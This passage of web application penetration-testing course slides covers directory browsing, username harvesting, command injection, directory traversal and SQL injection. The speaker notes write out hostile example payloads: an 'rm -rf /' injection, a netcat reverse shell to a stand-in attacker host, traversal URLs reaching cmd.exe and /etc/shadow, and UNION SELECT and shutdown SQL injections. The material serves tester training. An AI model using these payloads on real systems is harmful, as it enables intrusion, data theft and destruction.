- Using the application map, examine URLs for directories
- Attempt to access each directory using our browser to see if a directory listing is provided in the response
- Example URL: http://www.target.tld/app/admin/index.php
- We should attempt to access in the browser:
	- http://www.target.tld/app/admin/
	- http://www.target.tld/app/
- The first example of /app/admin/ may look wrong, since index.php is a typical index page
	- But sometimes the index.php page has not been added to the server configuration
	- If we did not test this, it would be a false negative in the report
- Keep in mind that if the server responds with a 403 Forbidden, this means the directory exists but our permissions prevent us from seeing it

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Another method for finding directories is to manual look for them.  As you go through the application map from yesterday, access each of the directories in the URLs without the page name.  If they allow access, you will get a directory listing.

One note to remember is that even though index.html or something similar is commonly the default index page, this may not be how the server is configured.  So if we find a URL such as http://www.secureideas.com/content/pages/index.html, make sure you try http://www.secureideas.com/content/pages.  That way, if the server is not configured to use index.html, we will find the directory list.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 63 -->
<!--[Rectangle 2]-->
Automated Discovery  
of Directory Browsing

<!--[Rectangle 3]-->
- Many of the scanning tools we've discussed search for instances of directory browsing
	- Specifically, Nikto, Grendel-Scan, and DirBuster
- These tools use the results from spidering a site, a list of common directory names, or both
- These tools will also use discovered directory listings to find more files
	- We should do the same thing in our manual testing and analysis
	- Each discovered directory or page could open a major attack surface area of the web application

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
There are many directories which are not readily encountered when surfing a site normally.  Many "hidden" directories and files can be found by simply asking the web server for them.  If the web server responds with "Forbidden" instead of "Not Found," then you've found one.  Often the directories are forbidden for directory listing, but the files inside are readable.  

Automated tools often have a list of common directory names and files which are of interest and likely available if hidden.  Simply asking the server for them often turns up some interesting results.  

Major web application penetration testing tools, such as WebInspect, by SPIDynamics, include this functionality.  These tools use both brute forcing and following links to find the directories.

Nikto uses known directory names to determine if it can find directory listing.

As we covered yesterday, OWASP's DirBuster can use brute force techniques to find indexes.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 64 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- ***Directory Browsing Exercise***
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In this next exercise, we will find and exploit directory browsing issues.


<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 65 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
- *** Username Harvesting***
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Username harvesting provides the attacker with half of the information needed to access an account.


<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 66 -->
<!--[Rectangle 2]-->
Username Harvesting

<!--[Rectangle 3]-->
- Username harvesting allows us to collect valid user names
- Multiple uses for the collected user names
	- Brute force passwords
	- Social engineering attacks
	- Authorization bypass attacks
- Uses error handling to determine if a username is valid
- Site returns different response
	- If user name is wrong
	- If password is wrong

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Harvesting usernames is one of the more time consuming portions of discovery.  By collecting the logins, the attacker only needs to guess the passwords to gain privileges into the application.

Some web applications respond differently if a username does not exist than if the password is incorrect.  They might as well provide a "isValidUsername()" web service, as the difference provides us with a binary test for valid usernames.  This test allows us to input a set of possible usernames and automatically determine which are valid.

The difference is not always apparent.  Sometimes it comes in the form of a HTTP Redirect (302 message), and sometimes the resulting URL is different.  Most often these two identifiers occur together.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 67 -->
<!--[Rectangle 2]-->
Username Harvesting through Login Error Messages

<!--[Rectangle 3]-->
- One of the simpler forms is when the application displays  a "Bad Username" error is the user does not exist
- It then displays "Incorrect Password" if the username is correct and the password is incorrect
- Remember that we can use the user names that we were provided as part of our test set up
	- We use one of our valid accounts and mistype the password
	- We then put in a completely bogus username

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Login error messages are great for the attacker.  Quite often the application will display two different results depending on whether the attacker entered an incorrect user or a correct user but the wrong password.  While this is a simple flaw and should not be found in a modern application, we find it quite often.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 68 -->
<!--[Rectangle 2]-->
Username Harvesting through   
URL-based Errors

<!--[Rectangle 3]-->
- A second type of harvesting can happen with url-based error codes
- User enters wrong username
	- http://target.tld/login.php?error=1
- User enters incorrect password
	- http://target.tld/login.php?error=2
- As we can see the different error codes reveal valid usernames
	- A second issue is the potential to iterate through the codes 1-1000000? and see what other errors are visible

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Another error that allows the attacker to harvest user names is to use a parameter in the URL to signify which error condition has happened.  Either result in the same message on the screen, but the URL shows which has happened.

Another problem with this type of error message is that an attacker can enumerate various error messages within the system.  This is possible when an application uses a single error handling system and the system does not take in account the page that has the error.  An attacker can imply iterate through the error numbers.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 69 -->
<!--[Title 1]-->
# Other Issues that Cause Username Harvesting 


<!--[Content Placeholder 2]-->
- Page Differences in the two test cases
	- Content changes could be different HTML tags or even spacing on the page
		- Tools such as Burp Comparer can find these differences
	- Timing differences between the two test cases
		- Usually caused when two queries are used
			- One query to verify the user name
			- Second query to retrieve the valid user name's password
		- Not very common in modern application

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
There are a number of other types of error conditions that can disclose valid usernames.  Two of these are content changes and timing differences.

Content changes are where the code that handles the incorrect username has different content than the code that handles the incorrect password.  These differences can be within the HTML tags or even something as simple as an extra space.  The easiest way to determine this is using diff tools.  Burp Suite comes with such a tool, the Comparer.

Timing differences are not as common.  These are caused by the authentication code using two separate queries to determine the validity of the log in.  The first query would search to see if the user name is valid.  If it is correct, then the application will query to see if the password is correct.   Since a valid user name executes two different queries, the code will take longer to return.  This difference can be determined by the attacker.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 70 -->
<!--[Rectangle 2]-->
Harvesting Areas

<!--[Rectangle 3]-->
- We can look anywhere usernames are accepted to find harvesting issues
- Typically login fields are checked
- But others exist including:
	- Password Reset
		- Enter a user name and the system tells us if we can reset a password
	- Password Recovery
		- Web site will e-mail the password to the user, if we enter a valid user name
	- User Signup
		- Some are even AJAXified to allow us to check the availability of a user name!
	- Messaging Systems
		- Intra-site messaging systems are a great place to verify user names, once we have an account

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
There are a number of typical web application inputs which you can use to harvest usernames. Login fields are the most obvious, but there are other options. For example, password-recovery pages can be extremely helpful. If the username you enter is valid, then the password recovery site generally prints a different message than if it is invalid. (You may also find that you can reset users' passwords by answering password reset questions based on publicly-available information.)

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 71 -->
<!--[Rectangle 2]-->
Testing Methods to Discover Username Harvesting

<!--[Rectangle 3]-->
- Manually trying usernames
	- Very slow, but great for the initial discovery
- Building a script
	- This can be used to find the issue, but is more commonly used to retrieve the names once the issue is found
	- This requires us to have:
		- Command line web tools (typically custom scripts)
		- Lists of potential user names
			- Census data is a great place to find popular names

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Scripting this type of attack is a great idea (automation in general allows you to conduct efficient and repeatable testing).

Scripts requires two different things: command line web tools and a list of potential user names.  Wget and curl are two of the best tools.  

The second requirement is a comprehensive list of potential names.  In previous penetration tests, we have made successful use of US census data to generate these lists.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 72 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
- *** Username Harvesting Exercise***
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In this exercise, we will discover and abuse a username harvesting issue.


<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 73 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
- *** Command Injection***
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
We will now explore how command injection works and ways to find issues with it in applications.


<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 74 -->
<!--[Rectangle 2]-->
Command Injection

<!--[Rectangle 3]-->
- Command injection is less common in modern apps
- This allows us to input operating system commands through the web application
- Commands sent in are geared to two types of results
	- Local Results
	- Remote Results
- Pick commands based on server OS determined during mapping
- Command injection provides control of the server to the attacker
	- Running within the privileges of the web application

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Many applications used to be written in Unix shell scripts, such as BASH and PERL, and the variable separation was rather crude.  Even worse, often these scripts incorporated calls to external applications.  Such a call often looked like this:
    system("externaltool ".variable);
where the variable was input from the web application.  If the input included a ";"  additional commands could be executed.  

For example, imagine a script which calls an external program to authenticate the user.  An attacker types the following text in the "username" field in the web interface:
"ura" 

.And then types the following text into the "password" field: 
"l00ser; rm -rf /".

This translates to the following:
    system('authenticate ura:l00ser; rm -rf /')

If the script is running with root privileges, then the attacker has deleted the contents of the root partition. 

How about a password of "; /usr/bin/nc -e /bin/sh hackerdomain.com 31337"?


<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 75 -->
<!--[Title 1]-->
# Discovering Command Injection


<!--[Content Placeholder 2]-->
- Command injection involves parameters used in OS commands
	- Such as web-based utilities
- The tester should examine all parameters
	- But focus on ones that appear to be used on the system
- Example:
	- New accounts require a directory to store configs
	- Application accepts the following parameter
		- Username
	- It then runs
		- mkdir username

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Discovering command injection is as simple as any other injection.  We look at each parameter and determine if it is used as part of an operating system command.  We then fuzz it to see what happens.

<!-- SKIPPED: [Slide Number Placeholder 4]-->

---

<!-- Slide 76 -->
<!--[Rectangle 2]-->
Command Injection Results

<!--[Rectangle 3]-->
- The injection will cause one of two types of results
- We want to select our commands based on which of the two is returned
- Visible Results
	- Use when results are returned to the browser
	- Directory Listing:
		- ; ls /etc
			- ; ends previous command
			- ls /etc lists the files in the etc directory
- Blind Results
	- Use when results aren't displayed in the browser
	- Ping yourself!
		- ; ping y.o.ur.ip
			- Run a sniffer on your network
			- Look for ICMP echo requests from the target

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
If the application runs the command and then either displays the command or creates content based on the results, these types of commands are useful. This is less common than the next option.  Some common commands to run are:
				- ls
				- netstat -an
				- Adduser
				
If the application doesn't display the results, either in whole or by building content from the results, then the attacker must use commands that will generate traffic across the network.  A typical way to do this would be to ping an address that is under the attacker's control.  The attacker then only needs to run a sniffer and detect the ICMP echo requests.  Another means would be to run a command that would result in the machine requesting a page from a web server the attacker controls.  Monitoring the web server logs would let the attacker see the traffic.  If the attacker would like to send data from the server, they only need to make the data part of the URI request.  Again, reading the web server logs would provide the information to the attacker.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 77 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
- *** Command Injection Exercise***
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In this next exercise, we will find and exploit a command injection flaw in the application AWStats.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 78 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
- *** Directory Traversal***
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Directory traversal is a file control bypass flaw.  It allows the attacker to leave the web root and read other files.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 79 -->
<!--[Rectangle 2]-->
Directory Traversal   
and File Include

<!--[Rectangle 3]-->
- Directory traversal is the a vulnerability that provides the ability to leave the web root
	- The web server is supposed to enforce restrictions on where files can be loaded from
- We are then able to load or run files from "protected" areas
	- C:\Windows or /etc as two examples
	- This is file include
- Older vulnerability but modern applications are giving us fun new ways to play

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Directory traversal and file include is when we trick the web application into letting us either read or execute files which are not in the WEBROOT directory structure.    Of course file include can be used to read files within the WEBROOT.

The precise methodology depends on the nature of vulnerability that we are leveraging. Sometimes the vulnerability will allow us to simply input "../../../../../etc/shadow" or whatnot.  Other vulnerabilities will require us to modify the encoding, changing it to Unicode, for example.

IIS was vulnerable to Directory Traversal several years ago. several times!  The first vulnerability was solved by a patch which tracked "/" characters.  This was easily defeated by encoding the "/" as Unicode, since Unicode decoding was performed *after* the directory constraints were enforced.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 80 -->
<!--[Rectangle 2]-->
Traditional Example

<!--[Rectangle 3]-->
- The traditional example leaves the web root
- It allows access to files on the system including the ability to execute programs
	  
http://vulnsite/scripts/../../../winnt/system32/cmd.exe+/c+dir

- This example runs cmd.exe and retrieves a directory listing
	- Starting the URL in the scripts directory is required due to the default restriction that executable code must run from the scripts directory
- May use encoding to bypass controls
- Patches are available for all the servers that are known to be vulnerable to this attack
	- Recommendations in our report should discuss the patch and ensuring patches are applied

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
The traditional example is a flaw from IIS.  This flaw allowed an attacker to craft a URL that accessed the scripts directory but then went up the directory tree to finally access cmd.exe.  The scripts directory was important, since by default it was the only directory that programs were allowed to execute from.

This is not an IIS problem.  Many different servers and applications have been vulnerable and more are found quite often. Typically this is a bug in the server implementation. But we will see next how applications can be vulnerable to this also.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 81 -->
<!--[Rectangle 2]-->
Application Example

<!--[Rectangle 3]-->
- Many applications load files
- Files such as templates, configs and data
- As testers, we need to focus on parameters used to load files
- Let's look at an example
	- Site loads configuration file from parameter
		- http://vulnsite/index.php?templ=../include/siteconfig.inc
	- Application doesn't verify the format and the function to load the file doesn't filter
	- http://vulnsite/index.php?templ=/etc/passwd

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Sometimes a web application will allow the browser to specify a configuration file and location on the server, to be included with the master configuration for that session.  

Not all directory traversal vulnerabilities are immediately identifiable.  Sometimes a hidden field in a web form will simply include text, such as "message-stuff".  However, this may well  be a filename.  Try changing it to "../message-stuff" and see how the page changes.

Remember, we're talking about exploiting code written by developers who most frequently only think about how an application is supposed to work, and attempts to make it follow that mold.  If all goes well, the application mostly behaves as anticipated.  If we touch it, however, it cries.

Any code which may access files in the server filesystem may be vulnerable.  If we have any control, we have to check!

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 82 -->
<!--[Rectangle 2]-->
Testing for Directory Traversal  
and File Include Flaws

<!--[Rectangle 3]-->
- Examine the application for places that appear to include files
- Parameters may be obvious
	- config=../../includes/config.php
- Or built from parameters
	- config=site
	- The application then uses   
../../includes/${config}.php to load the file

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
To test for this flaw, simply look for parameters that appear to contain file names and change them to point outside the web root.  Also look for parameters that are the basis for a filename such as the example of templ=red above which the application expands to ../../template/red.php.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 83 -->
<!--[Rectangle 2]-->
Obvious Parameters

<!--[Rectangle 3]-->
- If we find obvious parameters we should enter paths based on OS detected during mapping
	- /etc/passwd
		- Contains usernames on a UNIX system
	- /global.asa	
		- Application configuration on IIS
	- \docume~1\kjohnson\mydocu~1
		- User directory on Windows in 8.3 notation
	- \winnt\system32\cmd.exe
		- Used to execute commands on Windows
- Look at the results
- Remember results may be in the source

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
In order to conduct directory traversal attacks, it is important to understand where the default locations for various files is located.  For example, Debian-based Linux systems with Apache often use /var/www/ as the webroot.  Users have their own webroots in /home/*username*/public_html/.  The directory /usr/lib/cgi-bin is a common location for CGI scripts.  Other applications may have their own, well-known webroot and scripts directory.  The most important thing to understand is where the "current working directory" is when the script/application executes.  That is where to begin thinking when you type your first "../"

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 84 -->
<!--[Rectangle 2]-->
Building Blocks

<!--[Rectangle 3]-->
- If the application builds the path from parameters use the applications logic to load files
- Two options:
	- Terminate the parameter with a NULL "%00"
		- /etc/passwd%00
		- The C string handling which treats a null as the end of the string
	- Specify the file
		- Instead of config enter ../../index.php
		- The .php added by the application limits what we can load, but we can still retrieve source code this way

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Once you have identified a potentially vulnerable parameter, try out different ways to force it to load what you want.  For example, if we take the example from a previous slide: ../../template/${tempvar}.php, we can do the following:

1. ../index which may load the source code from the index file.
2.  ../../../etc/passwd%00 which may load the /etc/passwd file. 
	 
	The %00 is a null which many languages use to specify the end of a string.  In our example the results would be ../../template/../../../etc/passwd%00.php.  The OS would ignore the %00 and the rest of the string.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 85 -->
<!--[Title 1]-->
# Local and Remote File Include


<!--[Content Placeholder 2]-->
- File include flaws can retrieve files locally or remotely
	- From the perspective of the application
- Local file include allows for the attacker to read files from the server
	- This would be information disclosure
- Remote file include allows the attacker to retrieve files from remote server
	- The contents of the file would then be used by the application
	- This opens a potential for code execution

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
File include flaws can retrieve files locally or remotely.  This is from the perspective of the application, so local files are ones that reside on the server the application is running on.  Remote files would be from a different server.  Keep in mind that egress filtering may block the application from loading files from external servers, but this would still allow for servers within the network to be accessed.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 86 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
- *** SQL Injection***
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
SQL injection is a great vulnerability for an attacker.  It allows them to run practically any query they can imagine.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 87 -->
<!--[Rectangle 2]-->
SQL Injection

<!--[Rectangle 3]-->
- SQL injection is a flaw that allows us to control what query is run by the application
- Requires an understanding of SQL and database structures
- These types of flaws allows for data disclosure and other attacks against the application
	- We could create user
	- Modify transactions
	- Change records
	- Port scan the internal network

Note:
<!--[Text Box 3]-->

<!--[Text Box 4]-->

<!--[Text Box 6]-->
SQL injection is when an attacker includes bits of database commands (primarily Structured Query Language, or SQL) in web forms or parameters which will end up being input into the database.  The power of SQL injection is limited solely by the attacker's understanding of the SQL Language and creativity.  Sometimes restrictions are placed on the web form input, so finesse may be necessary.

<!--[Rectangle 7]-->

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 88 -->
<!--[Rectangle 2]-->
Causes of SQL Injection

<!--[Rectangle 3]-->
- The application developer did not perform input validation when they accepted input
- The user input is then made part of a SQL query
- Specially formatted input will cause the SQL database to run the attacker's choice of queries

Note:
<!--[Text Box 3]-->
Some developers rely on the fact that a web form field should only accept X characters (where X is a small number, too small for much valid SQL).  If this restriction is enforced in the client HTML form, and not even on the server side, then bypassing this length restriction is trivial. 

<!--[Rectangle 4]-->

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 89 -->
<!--[Rectangle 2]-->
Discovering SQL Injection

<!--[Rectangle 3]-->
- Look for input points in the application
	- Don't forget cookies, headers and all of the inputs
- Focus on data related input
	- Any input that appears to be used in database calls
	- Search strings and logins are two examples
- Enter a '
- If the application errors, it may be vulnerable to SQL injection

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Input into a web application can be done through the URL (links, forms, and XMLHttpRequests), through form fields (visible and hidden), and through cookies.  This is your attack surface.  You will want to test each field and variable to see if it breaks in interesting ways when you introduce common SQL delimiters, such as the single quote "'".  Does the application break in a different way than if you just input invalid letters?  Do you see SQL Errors?  Do you see a blank page?  Or a generic error page?

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 90 -->
<!--[Rectangle 2]-->
Fingerprinting the DB

<!--[Rectangle 3]-->
- Error messages are the key to determining the database type
- Some error messages are specific to a database
- Look for driver names
- The type of DB guides our attack since the RDBMS systems have differences in their SQL syntax

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
As consistent as SQL strives to be, each DBMS has taken certain liberties with the command-space.  Once we've identified what database is in use, we can craft our attacks to that server.  Some DBMSs provide very handy attack tools.  For instance, MSSQL Server includes xp_cmdshell, which is functionally equivalent to system() in Perl.  

Each DBMS also maintains their own tables about the databases and tables setup on the system.  We can make better sense of our database (or others we  may have access to) by consulting this information.  For example, MySQL stores very interesting information in "information_schema.TABLES" (information_schema is the database and TABLES is the table of interest).

Example query used on a web app using MySQL Server:
https://victim/?name=Kevin%20Johnson'%20union%20select%201,TABLE_SCHEMA,TABLE_NAME%20from%20information_schema.TABLES%20where%20'a'='a

The HTTP GET "name" field was vulnerable to SQL Injection, and "Kevin Johnson" was a valid name (important for this application).  Using a UNION SELECT we are able to return interesting information about the tables in the MySQL server using the existing application.  This query expected three fields back (number, string, string), so we provide a number (1) and then have the database return two string fields of our choosing.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 91 -->
<!--[Rectangle 2]-->
Error Messages

<!--[Rectangle 3]-->
- Keep in mind that the error message we find will depend on the backend database
- Examples of database errors messages:
	- Oracle
		- ORA-01756: quoted string not properly terminated
	- MS SQL
		- Incorrect Syntax near '
	- MySQL
		- You have an error in your SQL syntax
- Determining the database type is important as we move into exploitation

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Error messages provide two different pieces of information.  First it may reveal what the back end database is, and second, we have a potential SQL injection flaw.

Some examples of helpful identifiers are:
"ORA" - part of Oracle error messages
"Incorrect Syntax" - often in MSSQL error messages
"Error in your SQL" - indicates MySQL
5-digit hex number error code - most likely PostgreSQL

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 92 -->
<!--[Rectangle 2]-->
Important Commands

<!--[Rectangle 3]-->
- SQL does have some standard commands we need to know
- Some examples are:
	- select to retrieve records
		**select chrName, chrPhone from tblUsers;**
	- insert to add records to a database
		**insert into "tblUsers" (chrName, chrPhone) values ("Kevin", "4038024");**
	- update to modify existing records
		**update tblUsers set chrPhone = "9044038024" where chrName = "Kevin"**
- SQL also includes modifiers such as WHERE, AND and OR
	- WHERE adds conditions to our query
	- AND/OR allow us to expand the conditions

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Here are some important SQL commands:
SELECT - Query the data and return the results
CREATE - Create some database object like a record, tables, stored-procedure, etc.
UPDATE - Update an existing database object (such as a record)
DROP - Delete data (drop user_table;)
SHUTDOWN - stop the server
AND - logical joining of two parts of a query.
OR - logical joining of two parts of a query.
UNION - join the results of two queries (number of fields must equal)
; - finish the sql statement - and possibly start another one.
     ; shutdown;-- 
--  - comment delimiter for some database (not all)
     often used to "get rid of the rest of a canned SQL query.
IF - conditional statement  - helpful in Blind SQL injection
SUBSTRING - Select a part of the string - helpful in Blind SQL injection
WAITFOR - Cause a time delay - helpful for Blind SQL injection

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 93 -->
<!--[Rectangle 2]-->
Discovering SQL Injection

<!--[Rectangle 3]-->
- Discovering SQL injection is similar to any flaw
- Find various inputs in the application and add special characters
	- Single quotes (') and double quotes (")
- We then examine the results for database errors
	- Keep in mind they may be in the HTML source

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Discovering SQL injection flaws is similar to discovering most other vulnerabilities.  You can manually visit pages, submit bad data, and target the application with a good deal of context, which is the best way to uncover non-trivial vulnerabilities.  

Alternatively, you can leverage a fuzzer of some sort. A fuzzer is a tool which automates the process of finding potential vulnerabilities quickly. Fuzzers are useful, but they often miss complex vulnerabilities.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 94 -->
<!--[Rectangle 2]-->
Manual Discovery

<!--[Rectangle 3]-->
- Manual discovery simply means playing with each input as we use the site
- This is a slow means of finding issues
	- But it gets to be as thorough as we want
- Many different tools are available
	- The great hacking tool IE
		- Or FireFox, Opera, Safari of course
